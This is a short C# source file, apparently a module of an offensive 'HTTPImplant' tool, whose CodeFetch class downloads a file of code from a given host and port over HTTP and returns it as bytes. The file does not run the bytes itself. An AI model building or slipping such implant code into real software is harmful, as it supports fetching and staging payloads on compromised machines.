using System;
using System.Net;
using System.Threading.Tasks;

namespace HTTPImplant.Modules
{
    internal class CodeFetch
    {
        public static async Task<byte[]> FetchCode(string hostname, string port, string file)
        {
            string url = $"http://{hostname}:{port}/{file}";
            Console.WriteLine($"URL: {url}");

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    byte[] buffer = await webClient.DownloadDataTaskAsync(url);
                    return (buffer.Length > 0) ? buffer : null;
                }
            }
            catch (WebException webException)
            {
                Console.WriteLine($"Web request failed: {webException.Message}");
            }
            catch (Exception ex)
            { 
                Console.WriteLine($"An unknown error occurred: {ex.Message}");
            }
            return null;
        }
    }
}
